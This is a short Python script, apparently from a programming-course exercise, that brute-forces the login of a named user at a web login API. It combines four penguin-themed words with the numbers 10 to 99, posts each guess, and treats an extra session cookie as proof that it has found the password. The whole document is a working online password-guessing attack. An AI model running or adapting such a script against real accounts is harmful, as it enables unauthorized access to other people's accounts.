import requests
import sys

session = requests.Session()
PASSWORD_TEXTS = ('penguin','pingu','fish','antarktis')
for e in PASSWORD_TEXTS:
    for i in range(10,100):
        form={'name':'Lukas Ondrus','password':str(e)+str(i)}
        answ = session.post('https://flugpinguine.pgdp.de/login_api',form)        
        print(str(e)+str(i))
        print(session.cookies.get_dict())
        if len(session.cookies.get_dict()) >1:
            print('passwort ist: ' + str(e)+str(i))
            sys.exit()